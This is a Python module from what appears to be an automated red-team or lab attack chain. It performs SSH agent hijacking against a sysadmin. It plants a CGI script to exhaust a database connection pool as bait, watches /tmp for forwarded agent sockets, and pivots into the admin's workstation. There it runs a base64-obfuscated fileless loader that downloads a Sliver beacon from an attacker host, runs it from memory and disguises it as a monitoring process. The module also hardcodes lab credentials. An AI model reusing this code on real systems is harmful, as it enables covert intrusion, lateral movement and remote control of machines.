import re
import shlex
import socket
import threading
import time

from chainlog import log
from advanced_initial_access import sliver_exec, _list_sliver

# =============================================================================
# advanced_lateral_movement.py — Sysadmin Baiting & SSH Agent Hijacking
# MITRE ATT&CK:
#   T1499.003 - Endpoint Denial of Service: Application Exhaustion Flood (Connection Pool Exhaustion)
#   T1563.001 - Remote Service Session Hijacking: SSH Hijacking (SSH Agent Hijacking)
#   T1021.004 - Remote Services: SSH (Pivot to Workstation)
# -----------------------------------------------------------------------------
# All phases execute FROM apache via the root reverse shell.
#
# Phase 1 — Start the Watcher: Loop checking for /tmp/ssh-*/agent.*
# Phase 2 — The Bait: Deploy CGI script and exhaust DB connection pool.
# Phase 3 — (Simulation) Sysadmin vinzenz logs into apache via `ssh -A`.
# Phase 4 — Smash & Grab: Watcher finds the socket, sets SSH_AUTH_SOCK,
#           and pivots via SSH to vinzenz's workstation.
# Phase 5 — Catch Sliver beacon from Vinzenz's workstation.
# =============================================================================

KALI_HOST = "10.10.0.2"
VINZENZ_WS_IP = "10.30.0.8"
VINZENZ_USER = "vinzenz.fedora"

DB_HOST = "10.30.0.6"
DB_USER = "waystar-app"
DB_PASS = "AppBooking!2026"
DB_NAME = "waystar"


from advanced_initial_access import sliver_exec, _list_sliver, sliver_upload

def _fire_sliver_beacon_via_agent(root_sliver_session, socket_path, target_user, target_ip, kali_host):
    """
    Use the hijacked SSH agent socket to SSH into Vinzenz's workstation
    and execute a fileless Sliver beacon in RAM, disguised as a monitoring agent.
    """
    loader_code = f"""import urllib.request, ctypes, os, sys
try:
    libc = ctypes.CDLL(None)
    url_beac = "http://{kali_host}:8000/beacon_implant"
    with urllib.request.urlopen(url_beac) as r:
        data_beac = r.read()
    fd_beac = libc.syscall(319, b'httpd_cache', 1)
    if fd_beac >= 0:
        os.write(fd_beac, data_beac)
        if os.fork() == 0:
            try: os.close(1)
            except: pass
            try: os.close(2)
            except: pass
            os.execve(f"/proc/self/fd/{{fd_beac}}", ["[waystar-monitor]"], os.environ)
            sys.exit(0)
    sys.exit(0)
except Exception as e:
    sys.exit(1)
"""
    b64_loader = __import__('base64').b64encode(loader_code.encode()).decode()
    ssh_cmd = (
        f"execute -o -- sh -c 'SSH_AUTH_SOCK={socket_path} ssh "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-p 22 "
        f"{target_user}@{target_ip} "
        f"\"echo {b64_loader} | base64 -d | python3 -\"'"
    )
    sliver_exec(root_sliver_session, ssh_cmd)


def run(root_sliver_session, kali_host=KALI_HOST, target_ip=VINZENZ_WS_IP,
        target_user=VINZENZ_USER):
    """
    Execute the advanced lateral movement scenario.
    """
    log("\n[*] Starting Advanced Lateral Movement (SSH Agent Hijacking)...")

    # ------------------------------------------------------------------
    # Phase 1 & 2: The Bait (CGI Connection Leak)
    # ------------------------------------------------------------------
    log("[*] Phase 1: Deploying CGI bug to simulate connection leak...")
    
    cgi_script = f"""#!/usr/bin/env python3
import psycopg2, time
print("Content-Type: text/html\\n")
try:
    conn = psycopg2.connect(host='{DB_HOST}', dbname='{DB_NAME}', user='{DB_USER}', password='{DB_PASS}')
    time.sleep(600)
except:
    pass
"""
    b64_cgi = __import__('base64').b64encode(cgi_script.encode()).decode()
    sliver_exec(root_sliver_session, f"execute -o -- sh -c 'echo {b64_cgi} | base64 -d > /usr/local/apache2/cgi-bin/stats.cgi'")
    sliver_exec(root_sliver_session, "execute -o -- chmod +x /usr/local/apache2/cgi-bin/stats.cgi")

    log("[*] Phase 2: Triggering connection pool exhaustion (Slow Leak)...")
    def _trigger_leak():
        import urllib.request
        import random
        for _ in range(120):
            try:
                urllib.request.urlopen("http://10.40.0.2/cgi-bin/stats.cgi", timeout=0.1)
            except:
                pass
            time.sleep(random.uniform(0.05, 0.2))

    t_leak = threading.Thread(target=_trigger_leak, daemon=True)
    t_leak.start()
    
    # Wait a few seconds for the leak to establish before triggering admin
    time.sleep(5)
    log("[+] CGI requests firing in background. Legitimate DB requests will start failing soon.")

    # ------------------------------------------------------------------
    # Phase 3: Start the Watcher & Setup Listener
    # ------------------------------------------------------------------
    log("\n[*] Phase 3: Starting Watcher for SSH Agent Sockets in /tmp...")
    
    def _simulate_sysadmin_login():
        import subprocess
        log("[*] SIMULATION: Sysadmin logs into Apache from his workstation (ssh -A)...")
        cmd = (
            "sshpass -p 'VinzenzAdmin!2026' ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
            "vinzenz.fedora@10.30.0.8 "
            "\"ssh -A -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
            "vinzenz.fedora@10.40.0.2 'sleep 90'\""
        )
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    log("[*] Waiting for sysadmin to log in via 'ssh -A' (polling /tmp)...")
    _simulate_sysadmin_login()
    
    socket_path = None
    deadline = time.time() + 60
    
    while time.time() < deadline:
        out = sliver_exec(root_sliver_session, "execute -o -- sh -c 'find /tmp -type s -name \"agent.*\" 2>/dev/null | head -n 1'")
        if out and "agent." in out:
            for line in out.splitlines():
                if "/tmp/ssh-" in line and "/agent." in line:
                    socket_path = line.strip()
                    break
            if socket_path:
                break
        time.sleep(2)
        
    if not socket_path:
        log("[-] Timeout waiting for sysadmin SSH login.")
        return {"vinzenz_beacon": None}
        
    log(f"[+] WATCHER ALERT: SSH Agent socket found at {socket_path}")

    # ------------------------------------------------------------------
    # Phase 4: Smash and Grab
    # ------------------------------------------------------------------
    log(f"[*] Phase 4: Hijacking agent and dropping Sliver beacon on {target_user}@{target_ip}...")
    
    _fire_sliver_beacon_via_agent(root_sliver_session, socket_path, target_user, target_ip, kali_host)

    # ------------------------------------------------------------------
    # Cleanup & Verify
    # ------------------------------------------------------------------
    log("[*] Phase 5: Waiting for Vinzenz workstation Sliver beacon to check in...")
    
    # Snapshot active beacons before check-in to avoid matching stale/dead beacons
    from advanced_initial_access import _SESSION_HEADER_RE
    before_ids = set()
    output_before = _list_sliver("beacons")
    saw_header = False
    for line in output_before.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            continue
        if set(stripped) <= set("= "):
            continue
        before_ids.add(stripped.split()[0])

    # Wait for the beacon to check in
    vinzenz_beacon_id = None
    for attempt in range(12):
        time.sleep(5)
        output = _list_sliver("beacons")
        
        saw_header = False
        for line in output.splitlines():
            if _SESSION_HEADER_RE.search(line):
                saw_header = True
                continue
            if not saw_header:
                continue
            stripped = line.strip()
            if not stripped:
                continue
            if set(stripped) <= set("= "):
                continue
            if "[DEAD]" in stripped or "[KILLED]" in stripped:
                continue
                
            parts = stripped.split()
            b_id = parts[0]
            # Match new beacons only, filtered by name or target IP
            if b_id not in before_ids and ("vinzenz" in line.lower() or target_ip in line):
                vinzenz_beacon_id = b_id
                break
        if vinzenz_beacon_id:
            break
                
    if vinzenz_beacon_id:
        log(f"[+] Advanced Lateral Movement successful! Sliver Beacon ID: {vinzenz_beacon_id}")
    else:
        log("[-] Timeout waiting for beacon check-in.")

    # Clean up the CGI script itself, but the processes remain until the admin simulation restarts apache.
    log("[*] Attacker done. Admin simulation will restart apache to clear the leak shortly.")
    sliver_exec(root_sliver_session, "execute -o -- rm -f /usr/local/apache2/cgi-bin/stats.cgi")

    return {"vinzenz_beacon": vinzenz_beacon_id}

# Test mode — not executed when imported by main.py.
if __name__ == "__main__":
    pass
